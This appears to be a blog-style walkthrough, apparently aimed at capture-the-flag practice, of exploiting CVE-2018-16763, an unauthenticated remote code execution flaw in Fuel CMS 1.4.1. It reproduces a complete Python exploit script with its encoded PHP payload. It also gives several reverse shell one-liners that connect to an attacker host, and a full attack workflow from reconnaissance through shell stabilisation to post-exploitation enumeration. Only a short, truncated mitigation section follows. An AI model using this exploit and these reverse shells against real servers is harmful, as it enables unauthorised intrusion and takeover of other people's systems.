@@ -1,0 +1,446 @@
+Introduction
+
+Fuel CMS 1.4.1 contains a critical unauthenticated Remote Code Execution (RCE) vulnerability identified as CVE-2018–16763. This vulnerability allows attackers to execute arbitrary system commands on the target server without authentication, making it a severe security risk for organizations running vulnerable versions.
+
+In this technical deep dive, we’ll dissect the exploit mechanism, understand how the Python exploit script works, and explore advanced reverse shell techniques used to gain persistent access to compromised systems.
+Press enter or click to view image in full size
+Understanding the Vulnerability
+Root Cause Analysis
+
+The vulnerability exists in Fuel CMS’s page selection functionality, specifically in the /fuel/pages/select/ endpoint. The filter parameter lacks proper input sanitization, allowing attackers to inject and execute arbitrary PHP code.
+
+Vulnerable Code Pattern:
+
+// Simplified representation of vulnerable code
+$filter = $_GET['filter'];  // Unsanitized user input
+eval($filter);              // CRITICAL: Direct code execution
+
+Attack Vector
+
+The exploit leverages PHP’s variable function feature to bypass basic security controls:
+
+'+pi(print($a='system'))+$a('command')+'
+
+Execution Flow:
+
+    $a='system' assigns the string "system" to variable $a
+    print($a='system') returns the value without visible output
+    pi() is called (PHP's pi function - used as obfuscation)
+    $a('command') executes as system('command')
+
+This technique cleverly disguises the system() function call, potentially evading basic security filters.
+The Exploit Code Breakdown
+Press enter or click to view image in full size
+Complete Python Exploit Analysis
+
+Let’s examine the exploit script from Exploit-DB (ID: 50477) section by section:
+1. Import Dependencies
+
+#!/usr/bin/python3
+import requests
+from urllib.parse import quote
+import argparse
+import sys
+from colorama import Fore, Style
+
+Purpose of each import:
+
+    requests: Handles HTTP communication with the target
+    quote: URL-encodes special characters in payloads
+    argparse: Parses command-line arguments for user-friendly interface
+    sys: Provides system-level functions (exit, argv)
+    colorama: Adds colored output for better readability
+
+2. Argument Parser Configuration
+
+def get_arguments():
+    parser = argparse.ArgumentParser(
+        description='fuel cms fuel CMS 1.4.1 - Remote Code Execution Exploit',
+        usage=f'python3 {sys.argv[0]} -u <url>',
+        epilog=f'EXAMPLE - python3 {sys.argv[0]} -u http://10.10.21.74'
+    )
+    parser.add_argument('-v','--version',action='version',version='1.2',
+                       help='show the version of exploit')
+    parser.add_argument('-u','--url',metavar='url',dest='url',
+                       help='Enter the url')
+    args = parser.parse_args()
+    
+    if len(sys.argv) <=2:
+        parser.print_usage()
+        sys.exit()
+    return args
+
+Key Features:
+
+    -v/--version: Displays exploit version (1.2)
+    -u/--url: Specifies target URL (required)
+    Validation: Ensures minimum arguments are provided before execution
+
+3. URL Validation and Connection Test
+
+args = get_arguments()
+url = args.url
+
+# Basic URL validation
+if "http" not in url:
+    sys.stderr.write("Enter vaild url")
+    sys.exit()
+
+# Test target connectivity
+try:
+    r = requests.get(url)
+    if r.status_code == 200:
+        print(Style.BRIGHT+Fore.GREEN+"[+]Connecting..."+Style.RESET_ALL)
+except requests.ConnectionError:
+    print(Style.BRIGHT+Fore.RED+"Can't connect to url"+Style.RESET_ALL)
+    sys.exit()
+
+What happens here:
+
+    Extracts the URL from command-line arguments
+    Performs basic validation (checks for “http” in URL)
+    Tests connectivity by sending GET request
+    Provides visual feedback with colored output
+    Exits gracefully on connection failure
+
+4. Interactive Command Execution Loop
+
+while True:
+    cmd = input(Style.BRIGHT+Fore.YELLOW+"Enter Command $"+Style.RESET_ALL)
+    
+    # Construct malicious URL
+    main_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(cmd)+"%27%29%2b%27"
+    
+    # Execute exploit
+    r = requests.get(main_url)
+    
+    # Parse and display output
+    output = r.text.split('<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">')
+    print(output[0])
+    
+    # Exit condition
+    if cmd == "exit":
+        break
+
+5. The Payload Deconstructed
+
+Encoded URL Payload:
+
+%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27[COMMAND]%27%29%2b%27
+
+URL-Decoded Payload:
+
+'+pi(print($a='system'))+$a('[COMMAND]')+'
+
+Execution Breakdown:
+
+Step Code Action 1 ' Break out of SQL/PHP string context 2 + PHP string concatenation operator 3 $a='system' Assign 'system' to variable $a 4 print($a='system') Return 'system' without displaying output 5 pi(...) Call pi() function (obfuscation technique) 6 +$a('command') Execute system('command') via variable function 7 +' Close the injected PHP code
+
+Why This Works:
+
+    PHP allows variable functions: $var() calls the function named in $var
+    The payload disguises system() call to evade basic pattern matching
+    Single quotes break out of the expected input context
+
+6. Output Extraction
+
+output = r.text.split('<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">')
+print(output[0])
+
+Parsing Logic:
+
+    Fuel CMS displays errors in a distinctive red-bordered div
+    Command output appears before this error div
+    Script splits HTML at the error div and displays the first part
+    This cleanly extracts command output from surrounding HTML
+
+Visual Exploit Flow
+Reverse Shell Techniques
+
+While the web shell provides command execution, it has limitations:
+
+    No persistent connection
+    Limited interactivity
+    Easily detected by monitoring tools
+
+Solution: Establish a reverse shell for full interactive access.
+The Named Pipe Reverse Shell
+
+One of the most reliable reverse shell techniques uses named pipes (FIFOs):
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc YOUR_IP 4444 >/tmp/f
+
+Let’s break this down comprehensively:
+Part 1: Cleanup
+
+rm /tmp/f
+
+    Purpose: Removes any existing file named /tmp/f
+    Why necessary: Previous exploit attempts may have left this file
+    The semicolon (;): Command separator (equivalent to pressing Enter)
+
+Part 2: Create Named Pipe
+
+mkfifo /tmp/f
+
+    Function: Creates a named pipe (FIFO = First In, First Out)
+    What’s a named pipe? A special file that acts as a bidirectional data tube
+    Key property: Data written to one end emerges from the other end
+    Analogy: Think of it as a two-way walkie-talkie channel
+
+Technical Details:
+
+    Named pipes appear as files in the filesystem
+    Support bidirectional communication between processes
+    Block reads/writes until both ends are connected
+    Enable real-time data streaming
+
+Part 3: The Reverse Shell Pipeline
+
+This is where the magic happens:
+
+cat /tmp/f|/bin/bash -i 2>&1|nc YOUR_IP 4444 >/tmp/f
+
+Let’s dissect each component:
+Become a Medium member
+
+Component A: cat /tmp/f |
+
+    Function: Continuously reads from the named pipe
+    Role: Provides INPUT to bash (your commands from attacker machine)
+    Behavior: Blocks until data is available in the pipe
+
+Component B: /bin/bash -i
+
+    Function: Starts an interactive bash shell
+    -i flag: Interactive mode
+    Enables command prompts
+    Processes commands line by line
+    Provides full shell environment
+
+Component C: 2>&1 |
+
+    Function: Redirects stderr to stdout
+    Breakdown:
+    2 = File descriptor for stderr (error messages)
+    >&1 = Redirect to stdout (file descriptor 1)
+    Purpose: Ensures you see both:
+    Standard output (normal command results)
+    Error messages (debugging information)
+
+Component D: nc YOUR_IP 4444
+
+    Function: Establishes network connection to attacker
+    Parameters:
+    YOUR_IP: Attacker's IP address
+    4444: Listening port on attacker machine
+    Role: The communication channel back to you
+
+Component E: >/tmp/f
+
+    Function: Redirects netcat output back to the named pipe
+    Purpose: Creates the feedback loop
+    Result: Completes the bidirectional communication circuit
+
+Step-by-Step Execution Flow
+
+    Attacker types command (e.g., “whoami”)
+    Command travels through TCP to target’s netcat
+    Netcat writes to /tmp/f (named pipe)
+    cat reads from /tmp/f and pipes to bash
+    Bash executes the command (“whoami”)
+    Output goes to netcat (including errors via 2>&1)
+    Netcat sends output back to attacker over network
+    Netcat also writes to /tmp/f (completing the loop)
+    Attacker sees result in their terminal
+    Process repeats for next command
+
+Why Named Pipes Instead of Simple Redirect?
+
+Without named pipe (doesn’t work):
+
+bash -i >& /dev/tcp/ATTACKER_IP/4444
+
+One-way communication only, it can send OR receive, not both
+
+With named pipe (works perfectly):
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
+
+Bidirectional communication, means, full interactive shell
+
+The Difference:
+
+    Named pipes create a feedback loop
+    Enables true interactive shell experience
+    Commands flow IN, results flow OUT
+    Continuous, persistent connection
+
+Real-World Analogy
+
+Think of it like a phone call vs. a walkie-talkie:
+
+Without named pipe:
+
+    Like leaving a voicemail — you speak, they listen later
+    No real-time interaction
+    One direction at a time
+
+With named pipe:
+
+    Like a phone call — both parties can speak and listen
+    Real-time conversation
+    Bidirectional communication
+    The pipe is like the phone line connecting you
+
+Alternative Reverse Shell Methods
+Method 1: Python Reverse Shell
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+Advantages:
+
+    Python usually available on Linux systems
+    More reliable than bash redirection
+    Cleaner code execution
+
+Method 2: PHP Reverse Shell
+
+php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+Best for:
+
+    Web servers with PHP installed
+    When Python isn’t available
+    Quick exploitation of PHP applications
+
+Method 3: Netcat with -e Flag
+
+nc -e /bin/bash ATTACKER_IP 4444
+
+Note:
+
+    Simplest method IF available
+    Many systems disable -e flag for security
+    Use named pipe method as fallback
+
+Method 4: Netcat Traditional (No -e)
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
+
+Features:
+
+    Works on any system with netcat
+    Doesn’t require -e flag
+    Most portable solution
+
+Practical Demonstration
+Press enter or click to view image in full size
+Complete Attack Workflow
+Step 1: Reconnaissance
+
+# Scan target for Fuel CMS
+nmap -p80,443 -sV TARGET_IP
+
+# Check for Fuel CMS installation
+curl http://TARGET_IP/fuel/
+
+Step 2: Download and Prepare Exploit
+
+# Download exploit
+searchsploit -m 50477
+
+# Install dependencies
+pip3 install requests colorama
+
+# Make executable
+chmod +x 50477.py
+
+Step 3: Start Listener
+
+# Terminal 1: Start netcat listener
+nc -nlvp 4444
+
+Listener Flags:
+
+    -n: No DNS resolution (faster)
+    -l: Listen mode
+    -v: Verbose output
+    -p 4444: Listen on port 4444
+
+Step 4: Execute Exploit
+
+# Terminal 2: Run exploit
+python3 50477.py -u http://TARGET_IP
+
+Expected Output:
+
+[+]Connecting...
+Enter Command $
+
+Step 5: Establish Reverse Shell
+
+# In exploit shell, paste reverse shell command
+Enter Command $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
+
+What happens:
+
+    Command executes on target
+    Target connects back to your listener
+    You receive interactive shell in Terminal 1
+
+Step 6: Stabilise Shell
+
+Once you receive the shell:
+
+# Spawn full TTY shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+# Background the shell
+# Press: Ctrl+Z
+# Configure terminal
+stty raw -echo; fg
+# Set environment variables
+export TERM=xterm
+export SHELL=/bin/bash
+
+Benefits of stabilised shell:
+
+    Tab completion works
+    Command history available (arrow keys)
+    Can use text editors (vim, nano)
+    Clear screen with Ctrl+L
+    Proper terminal dimensions
+
+Step 7: Post-Exploitation
+
+# Identify current user
+whoami
+id
+
+# Check system information
+uname -a
+cat /etc/os-release
+# Search for flags/sensitive data
+find / -name "flag*.txt" 2>/dev/null
+find / -name "root.txt" 2>/dev/null
+find /home -type f -name "*.txt" 2>/dev/null
+# Check sudo permissions
+sudo -l
+# Look for SUID binaries
+find / -perm -4000 2>/dev/null
+# Enumerate network connections
+netstat -tuln
+# Check running processes
+ps aux
+
+Mitigation Strategies
+For System Administrators
+1. Update Fuel CMS Immediately
+
+# Check current version
+grep "VERSION" /var/www/html/fuel/modules/fuel/config/fuel.php
+
+# Update to latest version
+cd /var/www/html
+git pull origin master
